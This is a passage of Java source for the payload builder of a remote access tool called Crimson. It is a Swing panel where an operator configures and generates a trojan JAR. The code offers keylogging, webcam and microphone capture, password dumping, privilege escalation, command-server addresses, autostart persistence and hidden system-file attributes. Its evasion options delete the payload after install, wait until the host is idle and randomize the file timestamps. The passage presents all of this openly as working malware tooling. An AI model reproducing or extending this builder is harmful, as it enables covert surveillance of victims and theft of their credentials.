package subterranean.crimson.server.graphics.panels.generate.jar;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.io.File;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

import javax.crypto.spec.SecretKeySpec;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingConstants;
import javax.swing.border.LineBorder;
import javax.swing.border.TitledBorder;

import net.sourceforge.jcalendarbutton.JCalendarButton;
import subterranean.crimson.server.Server;
import subterranean.crimson.server.generation.JAR;
import subterranean.crimson.server.graphics.GeneratePayload;
import subterranean.crimson.server.graphics.GraphicUtilities;
import subterranean.crimson.server.network.ClientListener;
import subterranean.crimson.universal.Cryptography;
import subterranean.crimson.universal.EncType;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Path;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.PortSpec;
import subterranean.crimson.universal.Reporter;
import subterranean.crimson.universal.Version;
import subterranean.crimson.universal.containers.AddressSpec;
import subterranean.crimson.universal.containers.AutostartWINDOWS;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.translation.T;

import javax.swing.BoxLayout;

import java.awt.Dimension;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;

public class Main extends JPanel {

	private JTabbedPane tabbedPane;

	private JTextField textField_output_path;
	private JTextField textField_output_name;
	private JTextField windows_name;
	private JTextField textField_server_address;
	private JTextField textField_server_port;
	private JCheckBox chckbxMelt;
	private JTextField client_name;
	private JPasswordField passwordField;
	private JLabel lblPassword;
	private JComboBox windows_path;
	private JCheckBox chckbxInstallWhenUser;
	private JLabel lblExecutionTimer;
	private JLabel lblSeconds;
	private JTextField textField_backup_address;
	private JTextField textField_backup_port;
	private JCheckBox chckbxDownloadAllFeatures;
	private JCheckBox chckbxKeylogger;
	private JCheckBox chckbxVnc;
	private JCheckBox chckbxPacketSniffer;
	private JCheckBox chckbxWebcamCapture;
	private JCheckBox chckbxPrivilegeEscalator;
	private JCheckBox chckbxDetailedSystemInfo;
	private JCheckBox chckbxClipboardManipulator;
	private JCheckBox chckbxProcessManager;
	private JCheckBox chckbxRegistryManager;
	private JCheckBox chckbxPasswordDumper;
	private JCheckBox chckbxMicrophoneCapture;
	private JCheckBox chckbxFileExplorer;
	private JCalendarButton payload_calender;
	private JPasswordField crimson_password;
	private JTextField crimson_username;
	private JPanel cards;
	private JComboBox comboBox;
	private JTextField crimson_port;
	private JCalendarButton installed_calender;
	private DateFormat df;
	private JTextField linux_name;
	private JTextField osx_name;
	private JComboBox linux_path;
	private JComboBox osx_path;
	private JCheckBox chckbxErrorHandling;
	private JComboBox comboBox_1;
	private JButton btnView;
	private JCheckBox chckbxIWillBe;
	private JButton btnGenerate;
	private JTextField payload_jar_time_textField;
	private JTextField installed_jar_time_textField;
	public static DateFormat dateFormat = DateFormat.getDateInstance(DateFormat.MEDIUM);
	public static DateFormat timeFormat = DateFormat.getTimeInstance(DateFormat.SHORT);
	public static DateFormat dateTimeFormat = DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.SHORT);
	private JTextField delay_field;

	private GeneratePayload parent;

	public Main(final GeneratePayload p) {
		parent = p;
		setLayout(new BorderLayout(0, 0));
		setBounds(100, 100, 596, 340);
		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		add(tabbedPane, BorderLayout.CENTER);

		if (Server.getSettings().isInformationPanels()) {
			tabbedPane.addTab("Information", new InfoPanel());

		}

		// check for loaded settings settings file

		if (Server.getSettings().getSavedJarPayloadOptions() == null) {
			tabbedPane.addTab("Restore Values", new SettingsPanel());

		}

		df = new SimpleDateFormat("MMM dd, yyyy HH:mm a");

		JPanel features_panel = new JPanel();
		// tabbedPane.addTab("Features", null, features_panel, null);
		features_panel.setLayout(null);

		chckbxFileExplorer = new JCheckBox("File Explorer");
		chckbxFileExplorer.setSelected(true);
		chckbxFileExplorer.setBounds(8, 8, 112, 24);
		features_panel.add(chckbxFileExplorer);

		chckbxDownloadAllFeatures = new JCheckBox("Download All Features on Run");
		chckbxDownloadAllFeatures.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (chckbxDownloadAllFeatures.isSelected()) {
					// uncheck all features
					chckbxFileExplorer.setSelected(false);
					// TODO the rest

				}
			}
		});
		chckbxDownloadAllFeatures.setBounds(157, 250, 254, 24);
		features_panel.add(chckbxDownloadAllFeatures);

		chckbxKeylogger = new JCheckBox("Keylogger");
		chckbxKeylogger.setSelected(true);
		chckbxKeylogger.setBounds(8, 36, 112, 24);
		features_panel.add(chckbxKeylogger);

		chckbxVnc = new JCheckBox("VNC");
		chckbxVnc.setBounds(8, 64, 112, 24);
		features_panel.add(chckbxVnc);

		chckbxPacketSniffer = new JCheckBox("Packet Sniffer");
		chckbxPacketSniffer.setBounds(8, 92, 112, 24);
		features_panel.add(chckbxPacketSniffer);

		chckbxWebcamCapture = new JCheckBox("Webcam Capture");
		chckbxWebcamCapture.setBounds(8, 120, 129, 24);
		features_panel.add(chckbxWebcamCapture);

		chckbxPrivilegeEscalator = new JCheckBox("Privilege Escalator");
		chckbxPrivilegeEscalator.setBounds(8, 148, 144, 24);
		features_panel.add(chckbxPrivilegeEscalator);

		chckbxDetailedSystemInfo = new JCheckBox("Detailed System Info");
		chckbxDetailedSystemInfo.setBounds(250, 8, 144, 24);
		features_panel.add(chckbxDetailedSystemInfo);

		chckbxClipboardManipulator = new JCheckBox("Clipboard Manipulator");
		chckbxClipboardManipulator.setBounds(250, 36, 161, 24);
		features_panel.add(chckbxClipboardManipulator);

		chckbxProcessManager = new JCheckBox("Process Manager");
		chckbxProcessManager.setBounds(250, 64, 144, 24);
		features_panel.add(chckbxProcessManager);

		chckbxRegistryManager = new JCheckBox("Registry Manager");
		chckbxRegistryManager.setBounds(250, 92, 144, 24);
		features_panel.add(chckbxRegistryManager);

		chckbxPasswordDumper = new JCheckBox("Password Dumper");
		chckbxPasswordDumper.setBounds(250, 120, 144, 24);
		features_panel.add(chckbxPasswordDumper);

		chckbxMicrophoneCapture = new JCheckBox("Microphone Capture");
		chckbxMicrophoneCapture.setBounds(250, 148, 144, 24);
		features_panel.add(chckbxMicrophoneCapture);

		final JFileChooser fc = new JFileChooser();

		JPanel settings_panel = new JPanel();
		tabbedPane.addTab("Settings", null, settings_panel, null);
		settings_panel.setLayout(new BorderLayout(0, 0));

		JPanel panel_8 = new JPanel();
		settings_panel.add(panel_8);
		panel_8.setLayout(new BoxLayout(panel_8, BoxLayout.Y_AXIS));

		JPanel info_panel = new JPanel();
		panel_8.add(info_panel);
		info_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Optional Information", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		info_panel.setLayout(null);

		JLabel lbloptionalVersionNumber = new JLabel("Client Identifier:");
		lbloptionalVersionNumber.setBounds(12, 30, 130, 15);
		info_panel.add(lbloptionalVersionNumber);
		lbloptionalVersionNumber.setToolTipText("");

		client_name = new JTextField();
		client_name.setText("CR");
		client_name.setBounds(217, 26, 220, 19);
		info_panel.add(client_name);
		client_name.setToolTipText("Payload version number.  May be in any format.");
		client_name.setColumns(10);

		JLabel lblJarCreationDate = new JLabel("Output Jar Creation Date:");
		lblJarCreationDate.setEnabled(true);
		lblJarCreationDate.setBounds(12, 57, 202, 16);
		info_panel.add(lblJarCreationDate);

		payload_calender = new JCalendarButton();
		payload_calender.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
			public void propertyChange(java.beans.PropertyChangeEvent evt) {
				if (evt.getNewValue() instanceof Date) {

					setPayloadDate((Date) evt.getNewValue());
				}
			}
		});
		payload_calender.setBounds(449, 56, 30, 20);
		info_panel.add(payload_calender);

		payload_jar_time_textField = new JTextField("[CURRENT]");
		payload_jar_time_textField.setEnabled(true);
		payload_jar_time_textField.setBounds(217, 56, 220, 20);
		info_panel.add(payload_jar_time_textField);
		payload_jar_time_textField.setColumns(10);

		JLabel lblInstalledJarCreation = new JLabel("Installed Jar Creation Date:");
		lblInstalledJarCreation.setBounds(12, 85, 202, 16);
		info_panel.add(lblInstalledJarCreation);

		installed_jar_time_textField = new JTextField("[CURRENT]");
		installed_jar_time_textField.setBounds(217, 84, 220, 20);
		info_panel.add(installed_jar_time_textField);
		installed_jar_time_textField.setColumns(10);

		installed_calender = new JCalendarButton();
		installed_calender.addPropertyChangeListener(new PropertyChangeListener() {
			public void propertyChange(PropertyChangeEvent arg0) {
				if (arg0.getNewValue() instanceof Date) {

					setInstalledDate((Date) arg0.getNewValue());
				}

			}
		});
		installed_calender.setBounds(449, 84, 30, 20);
		info_panel.add(installed_calender);

		JButton btnRandomizeName_1 = new JButton(T.t("misc-randomize"));
		btnRandomizeName_1.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				client_name.setText(subterranean.crimson.universal.Utilities.nameGen(5));
			}
		});
		btnRandomizeName_1.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandomizeName_1.setBounds(491, 26, 88, 19);
		info_panel.add(btnRandomizeName_1);

		JButton button = new JButton(T.t("misc-randomize"));
		button.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				long time = GraphicUtilities.randLong(new Date().getTime());

				setPayloadDate(new Date(time));
			}
		});
		button.setFont(new Font("Dialog", Font.BOLD, 9));
		button.setBounds(491, 56, 88, 20);
		info_panel.add(button);

		JButton button_1 = new JButton(T.t("misc-randomize"));
		button_1.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				long time = GraphicUtilities.randLong(new Date().getTime());

				setInstalledDate(new Date(time));
			}
		});
		button_1.setFont(new Font("Dialog", Font.BOLD, 9));
		button_1.setBounds(491, 84, 88, 20);
		info_panel.add(button_1);

		windows_name = new JTextField();
		windows_name.setText("cr.jar");
		windows_name.setBounds(97, 47, 114, 19);

		windows_name.setColumns(10);

		JPanel execution_panel = new JPanel();
		tabbedPane.addTab("Execution", null, execution_panel, null);
		execution_panel.setLayout(new BorderLayout(0, 0));

		JTabbedPane executionPane = new JTabbedPane(JTabbedPane.LEFT);
		execution_panel.add(executionPane);

		JPanel execution_path_panel = new JPanel();
		executionPane.addTab("Paths", null, execution_path_panel, null);
		execution_path_panel.setLayout(null);

		JPanel windows_panel = new JPanel();
		windows_panel.setBounds(10, 12, 490, 75);
		execution_path_panel.add(windows_panel);
		windows_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Windows", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		windows_panel.setLayout(null);

		JLabel lblInstallPath = new JLabel("Install Path:");
		lblInstallPath.setHorizontalAlignment(SwingConstants.TRAILING);
		lblInstallPath.setFont(new Font("Dialog", Font.BOLD, 11));
		lblInstallPath.setBounds(8, 22, 82, 15);
		windows_panel.add(lblInstallPath);

		windows_path = new JComboBox();
		windows_path.setFont(new Font("Dialog", Font.BOLD, 10));
		windows_path.setToolTipText("Select an install path from the list or type your own.");
		windows_path.setModel(new DefaultComboBoxModel(new String[] { "C:\\Users\\%USERNAME%\\Documents\\", "%TEMPDIR%\\", "C:\\Users\\%USERNAME%\\Favorites\\" }));
		windows_path.setBounds(97, 17, 381, 23);
		windows_panel.add(windows_path);
		windows_path.setEditable(true);

		JLabel lblNewLabel = new JLabel("Name:");
		lblNewLabel.setHorizontalAlignment(SwingConstants.TRAILING);
		lblNewLabel.setBounds(28, 49, 62, 15);
		windows_panel.add(lblNewLabel);

		windows_panel.add(windows_name);

		JButton btnRandomize = new JButton(T.t("misc-randomize"));
		btnRandomize.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				windows_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".jar");
			}
		});
		btnRandomize.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandomize.setBounds(223, 47, 88, 19);
		windows_panel.add(btnRandomize);

		JPanel linux_panel = new JPanel();
		linux_panel.setLayout(null);
		linux_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Linux", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		linux_panel.setBounds(10, 99, 490, 75);
		execution_path_panel.add(linux_panel);

		JLabel label = new JLabel("Install Path:");
		label.setHorizontalAlignment(SwingConstants.TRAILING);
		label.setFont(new Font("Dialog", Font.BOLD, 11));
		label.setBounds(8, 22, 82, 15);
		linux_panel.add(label);

		linux_path = new JComboBox();
		linux_path.setFont(new Font("Dialog", Font.BOLD, 10));
		linux_path.setModel(new DefaultComboBoxModel(new String[] { "/home/%USERNAME%/.crimson/", "/home/%USERNAME%/" }));
		linux_path.setToolTipText("Select an install path from the list or type your own.");
		linux_path.setEditable(true);
		linux_path.setBounds(97, 17, 381, 23);
		linux_panel.add(linux_path);

		JLabel label_2 = new JLabel("Name:");
		label_2.setHorizontalAlignment(SwingConstants.TRAILING);
		label_2.setBounds(28, 49, 62, 15);
		linux_panel.add(label_2);

		linux_name = new JTextField();
		linux_name.setText("cr.jar");
		linux_name.setColumns(10);
		linux_name.setBounds(97, 47, 114, 19);
		linux_panel.add(linux_name);

		JButton btnRandomize_1 = new JButton(T.t("misc-randomize"));
		btnRandomize_1.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				linux_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".jar");
			}
		});
		btnRandomize_1.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandomize_1.setBounds(223, 47, 88, 19);
		linux_panel.add(btnRandomize_1);

		JPanel osx_panel = new JPanel();
		osx_panel.setLayout(null);
		osx_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "OS X", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		osx_panel.setBounds(10, 186, 490, 75);
		execution_path_panel.add(osx_panel);

		JLabel label_3 = new JLabel("Install Path:");
		label_3.setHorizontalAlignment(SwingConstants.TRAILING);
		label_3.setFont(new Font("Dialog", Font.BOLD, 11));
		label_3.setBounds(8, 22, 82, 15);
		osx_panel.add(label_3);

		osx_path = new JComboBox();
		osx_path.setModel(new DefaultComboBoxModel(new String[] { "/Users/%USERNAME%/.crimson/" }));
		osx_path.setFont(new Font("Dialog", Font.BOLD, 10));
		osx_path.setToolTipText("Select an install path from the list or type your own.");
		osx_path.setEditable(true);
		osx_path.setBounds(97, 17, 381, 23);
		osx_panel.add(osx_path);

		JLabel label_4 = new JLabel("Name:");
		label_4.setHorizontalAlignment(SwingConstants.TRAILING);
		label_4.setBounds(28, 49, 62, 15);
		osx_panel.add(label_4);

		osx_name = new JTextField();
		osx_name.setText("cr.jar");
		osx_name.setColumns(10);
		osx_name.setBounds(97, 47, 114, 19);
		osx_panel.add(osx_name);

		JButton btnRandomize_2 = new JButton(T.t("misc-randomize"));
		btnRandomize_2.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				osx_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".jar");
			}
		});
		btnRandomize_2.setFont(new Font("Dialog", Font.BOLD, 9));
		btnRandomize_2.setBounds(223, 47, 88, 19);
		osx_panel.add(btnRandomize_2);

		JPanel execution_options_panel = new JPanel();
		executionPane.addTab("Options", null, execution_options_panel, null);
		execution_options_panel.setBorder(null);
		execution_options_panel.setLayout(null);

		JTabbedPane tabbedPane_1 = new JTabbedPane(JTabbedPane.BOTTOM);
		tabbedPane_1.setBounds(0, 0, 512, 305);
		execution_options_panel.add(tabbedPane_1);

		JPanel panel_4 = new JPanel();
		tabbedPane_1.addTab("Platform Independent", null, panel_4, null);
		panel_4.setLayout(null);

		lblExecutionTimer = new JLabel("Execution Delay:");
		lblExecutionTimer.setBounds(8, 14, 124, 16);
		panel_4.add(lblExecutionTimer);

		delay_field = new JTextField();
		delay_field.setBounds(126, 12, 54, 20);
		panel_4.add(delay_field);
		delay_field.setToolTipText("How long to wait to install upon execution.");
		delay_field.setText("0");
		delay_field.setColumns(10);

		lblSeconds = new JLabel("seconds");
		lblSeconds.setBounds(185, 14, 63, 16);
		panel_4.add(lblSeconds);

		chckbxInstallWhenUser = new JCheckBox("Install when host becomes IDLE");
		chckbxInstallWhenUser.setBounds(8, 38, 249, 24);
		panel_4.add(chckbxInstallWhenUser);
		chckbxInstallWhenUser.setToolTipText("Crimson will only install on an IDLE host");

		chckbxErrorHandling = new JCheckBox("Handle Errors");
		chckbxErrorHandling.setBounds(8, 57, 249, 23);
		panel_4.add(chckbxErrorHandling);
		chckbxErrorHandling.setToolTipText("If any stage of the installation fails, Crimson will automatically try to fix it.");

		chckbxMelt = new JCheckBox("Melt on Execution");
		chckbxMelt.setBounds(319, 39, 180, 23);
		panel_4.add(chckbxMelt);
		chckbxMelt.setSelected(true);
		chckbxMelt.setToolTipText("Deletes the payload after installation.");

		JPanel panel_7 = new JPanel();
		panel_7.setBorder(new TitledBorder(null, "Installation Message", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_7.setBounds(8, 118, 487, 148);
		panel_4.add(panel_7);
		panel_7.setLayout(null);
		chckbxInstallWhenUser.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				if (chckbxInstallWhenUser.isSelected()) {
					// grey out delay
					lblExecutionTimer.setEnabled(false);
					delay_field.setEnabled(false);
					lblSeconds.setEnabled(false);

				} else {
					// ungrey delay
					lblExecutionTimer.setEnabled(true);
					delay_field.setEnabled(true);
					lblSeconds.setEnabled(true);

				}
			}
		});

		JPanel panel_5 = new JPanel();
		tabbedPane_1.addTab("Windows", null, panel_5, null);
		panel_5.setLayout(null);

		JPanel panel_2 = new JPanel();
		panel_2.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Autostart Persistance", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_2.setBounds(12, 12, 483, 75);
		panel_5.add(panel_2);
		panel_2.setLayout(null);

		JLabel lblAutostart = new JLabel("Persistance Method:");
		lblAutostart.setBounds(12, 20, 152, 16);
		panel_2.add(lblAutostart);

		comboBox_3 = new JComboBox();
		comboBox_3.setModel(new DefaultComboBoxModel(AutostartWINDOWS.values()));
		comboBox_3.setBounds(160, 16, 168, 25);
		panel_2.add(comboBox_3);

		JCheckBox chckbxCycle = new JCheckBox("Cycle");
		chckbxCycle.setBounds(22, 44, 125, 24);
		panel_2.add(chckbxCycle);

		JPanel panel_3 = new JPanel();
		panel_3.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Payload Properties", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		panel_3.setBounds(12, 99, 483, 67);
		panel_5.add(panel_3);
		panel_3.setLayout(null);

		JCheckBox chckbxHidden = new JCheckBox("Hidden");
		chckbxHidden.setBounds(8, 24, 125, 24);
		panel_3.add(chckbxHidden);

		JCheckBox chckbxSystem = new JCheckBox("System");
		chckbxSystem.setBounds(191, 24, 125, 24);
		panel_3.add(chckbxSystem);

		JCheckBox chckbxReadOnly = new JCheckBox("Read Only");
		chckbxReadOnly.setBounds(350, 24, 125, 24);
		panel_3.add(chckbxReadOnly);

		JPanel panel_6 = new JPanel();
		tabbedPane_1.addTab("Unix", null, panel_6, null);

		JPanel networking_panel = new JPanel();
		tabbedPane.addTab("Networking", null, networking_panel, null);
		networking_panel.setLayout(new BoxLayout(networking_panel, BoxLayout.Y_AXIS));

		JPanel com_panel = new JPanel();
		com_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Communications", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		networking_panel.add(com_panel);
		com_panel.setLayout(null);

		cards = new JPanel();
		cards.setBorder(new LineBorder(new Color(0, 0, 0)));
		cards.setBounds(12, 67, 567, 77);
		com_panel.add(cards);
		cards.setLayout(new CardLayout(0, 0));

		JPanel panel = new JPanel();
		cards.add(panel, "Traditional");
		panel.setLayout(null);

		JLabel lblCommandServerAddress = new JLabel("Primary Address:");
		lblCommandServerAddress.setBounds(12, 20, 140, 15);
		panel.add(lblCommandServerAddress);

		textField_server_address = new JTextField();
		textField_server_address.setBounds(156, 20, 235, 19);
		panel.add(textField_server_address);
		textField_server_address.setColumns(10);

		JLabel lblCommandServerPort = new JLabel("Port:");
		lblCommandServerPort.setBounds(409, 20, 36, 15);
		panel.add(lblCommandServerPort);

		textField_server_port = new JTextField();
		textField_server_port.addKeyListener(new KeyAdapter() {
			@Override
			public void keyReleased(KeyEvent e) {
				updateCompatibility();
			}
		});

		textField_server_port.setBounds(463, 20, 44, 19);
		panel.add(textField_server_port);
		textField_server_port.setColumns(10);

		JLabel lblBackupServerAddress = new JLabel("Backup Address:");
		lblBackupServerAddress.setBounds(12, 59, 140, 16);
		panel.add(lblBackupServerAddress);

		textField_backup_address = new JTextField();
		textField_backup_address.setBounds(156, 58, 235, 20);
		panel.add(textField_backup_address);
		textField_backup_address.setColumns(10);

		JLabel label_1 = new JLabel("Port:");
		label_1.setBounds(409, 60, 36, 15);
		panel.add(label_1);

		textField_backup_port = new JTextField();
		textField_backup_port.setBounds(463, 61, 44, 20);
		panel.add(textField_backup_port);
		textField_backup_port.setColumns(10);

		JPanel panel_1 = new JPanel();
		cards.add(panel_1, "CrimsonDNS");
		panel_1.setLayout(null);

		JLabel lblCrimsonUsername = new JLabel("Crimson Username:");
		lblCrimsonUsername.setBounds(102, 23, 122, 16);
		panel_1.add(lblCrimsonUsername);

		JLabel lblPassword_1 = new JLabel("Password:");
		lblPassword_1.setBounds(156, 51, 68, 16);
		panel_1.add(lblPassword_1);

		crimson_password = new JPasswordField();
		crimson_password.setBounds(229, 51, 104, 20);
		panel_1.add(crimson_password);

		crimson_username = new JTextField();
		crimson_username.setBounds(229, 21, 104, 20);
		panel_1.add(crimson_username);
		crimson_username.setColumns(10);

		JLabel lblPort = new JLabel("Port:");
		lblPort.setBounds(191, 79, 33, 15);
		panel_1.add(lblPort);

		crimson_port = new JTextField();
		crimson_port.setBounds(229, 76, 48, 20);
		panel_1.add(crimson_port);
		crimson_port.setColumns(10);

		comboBox = new JComboBox();
		comboBox.setEnabled(false);
		comboBox.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JComboBox cb = (JComboBox) arg0.getSource();

				CardLayout cl = (CardLayout) (cards.getLayout());
				cl.show(cards, (String) cb.getSelectedItem());

			}
		});
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "Traditional", "CrimsonDNS" }));
		comboBox.setBounds(12, 23, 142, 25);
		com_panel.add(comboBox);

		chckbxSslConnection = new JCheckBox("SSL Connection");
		chckbxSslConnection.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				updateCompatibility();
			}
		});
		chckbxSslConnection.setBounds(162, 24, 152, 23);
		com_panel.add(chckbxSslConnection);

		JPanel encryption_panel = new JPanel();
		encryption_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Encryption", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		networking_panel.add(encryption_panel);
		encryption_panel.setLayout(null);

		lblPassword = new JLabel("Password:");
		lblPassword.setBounds(231, 28, 75, 15);
		encryption_panel.add(lblPassword);
		lblPassword.setEnabled(false);

		passwordField = new JPasswordField();
		passwordField.addKeyListener(new KeyAdapter() {
			@Override
			public void keyReleased(KeyEvent e) {
				updateCompatibility();
			}
		});

		passwordField.setBounds(311, 26, 150, 19);
		encryption_panel.add(passwordField);
		passwordField.setEnabled(false);

		comboBox_1 = new JComboBox();
		comboBox_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if ((EncType) comboBox_1.getSelectedItem() == EncType.None) {
					btnView.setEnabled(false);
					lblPassword.setEnabled(false);
					passwordField.setEnabled(false);
					passwordField.setText("");

				} else {
					btnView.setEnabled(true);
					lblPassword.setEnabled(true);
					passwordField.setEnabled(true);

				}
				updateCompatibility();
			}
		});
		comboBox_1.setModel(new DefaultComboBoxModel(EncType.values()));
		comboBox_1.setBounds(12, 23, 136, 24);
		encryption_panel.add(comboBox_1);

		btnView = new JButton("View");
		btnView.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (passwordField.getEchoChar() == (char) 0) {
					passwordField.setEchoChar(new JPasswordField().getEchoChar());
				} else {
					passwordField.setEchoChar((char) 0);
				}
			}
		});
		btnView.setEnabled(false);
		btnView.setFont(new Font("Dialog", Font.BOLD, 10));
		btnView.setBounds(473, 26, 62, 19);
		encryption_panel.add(btnView);

		JComboBox comboBox_2 = new JComboBox();
		comboBox_2.setModel(new DefaultComboBoxModel(new String[] { "ECB" }));
		comboBox_2.setBounds(160, 23, 53, 24);
		encryption_panel.add(comboBox_2);

		JPanel generate_panel = new JPanel();
		tabbedPane.addTab("Generate", null, generate_panel, null);
		generate_panel.setLayout(null);

		btnGenerate = new JButton("GENERATE");
		btnGenerate.setEnabled(false);
		btnGenerate.setBounds(475, 275, 104, 25);
		btnGenerate.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (!btnGenerate.isEnabled()) {
					return;
				}

				// generate the options object
				Options opts = new Options();

				// start generation//
				// get options from fields
				String payload_date = payload_jar_time_textField.getText();
				String installed_date = installed_jar_time_textField.getText();
				EncType encryption = (EncType) comboBox_1.getSelectedItem();
				String passphrase = String.valueOf(passwordField.getPassword());

				// make sure these dates are valid
				Date Pdate = null;
				Date Idate = null;
				if (!payload_date.equals("[CURRENT]")) {
					try {
						Pdate = new SimpleDateFormat("MMM dd, yyyy HH:mm a", Locale.ENGLISH).parse(payload_date);

					} catch (ParseException e2) {
						// Wrong date format
						Logger.add("Failed to parse payload date");
						parent.addNotification("Failed to parse: \"" + payload_date + "\"; check format. Format: MMM dd, yyyy HH:mm a. Locale must be English as well.");
						return;
					}
				} else {
					Pdate = new Date();

				}

				if (!installed_date.equals("[CURRENT]")) {
					try {

						Idate = new SimpleDateFormat("MMM dd, yyyy HH:mm a", Locale.ENGLISH).parse(installed_date);
					} catch (ParseException e2) {
						// Wrong date format
						Logger.add("Failed to parse installed jar date");
						parent.addNotification("Failed to parse: \"" + installed_date + "\"; check format. Format: MMM dd, yyyy HH:mm a. Locale must be English as well.");

						return;
					}
				} else {
					Idate = new Date();

				}

				opts.encryptionType = encryption;

				opts.windows = new Path(((String) windows_path.getSelectedItem()), windows_name.getText());
				opts.linux = new Path(((String) linux_path.getSelectedItem()), linux_name.getText());
				opts.osx = new Path(((String) osx_path.getSelectedItem()), osx_name.getText());
				String lip = (String) linux_path.getSelectedItem();
				String oip = (String) osx_path.getSelectedItem();

				opts.win_autostart_method = (AutostartWINDOWS) comboBox_3.getSelectedItem();
				opts.executionDelay = Long.parseLong(delay_field.getText());
				opts.waitForIDLE = chckbxInstallWhenUser.isSelected();
				opts.melt = chckbxMelt.isSelected();
				opts.connectPeriod = 25000;

				Path outPATH = new Path(textField_output_path.getText(), textField_output_name.getText());
				opts.permaJarCreationDate = Idate;
				opts.handleErrors = chckbxErrorHandling.isSelected();

				if (((String) comboBox.getSelectedItem()).equals("Traditional")) {
					opts.crimsonDNS = false;
					opts.primaryAddress = new AddressSpec(textField_server_address.getText());
					opts.primaryPort = new PortSpec(textField_server_port.getText());

					String backupSA = textField_backup_address.getText();
					String backupP = textField_backup_port.getText();

					if (backupSA != null) {
						opts.backupAddress = new AddressSpec(textField_backup_address.getText());
					}

					if (backupP != null) {
						opts.backupPort = new PortSpec(backupP);
					}

				} else {
					// using CrimsonDNS
					opts.crimsonDNS = true;
					opts.crimsonDNS_user = crimson_username.getText();
				}

				if (encryption != EncType.None) {
					opts.key = Cryptography.makeKey(passphrase, encryption);

				}
				// save options even if invalid
				save(opts);
				//

				if (!validateFields(opts, outPATH)) {
					// something is invalid; dont generate
					Logger.add("Fix invalid parameter");

					return;
				}

				Thread p = new JAR(opts, outPATH, Pdate.getTime());
				p.start();
				//
				parent.dispose();
			}
		});
		generate_panel.add(btnGenerate);

		JPanel output_panel = new JPanel();
		output_panel.setBorder(new TitledBorder(new LineBorder(new Color(0, 0, 0)), "Output Location", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		output_panel.setBounds(12, 12, 567, 79);
		generate_panel.add(output_panel);
		output_panel.setLayout(null);

		JButton btnBrowse = new JButton("Browse");
		btnBrowse.setFont(new Font("Dialog", Font.BOLD, 10));
		btnBrowse.setBounds(467, 47, 88, 19);
		output_panel.add(btnBrowse);
		btnBrowse.setToolTipText("Opens a file chooser to select file.");

		JLabel lblOutputPath = new JLabel("Path:");
		lblOutputPath.setHorizontalAlignment(SwingConstants.TRAILING);
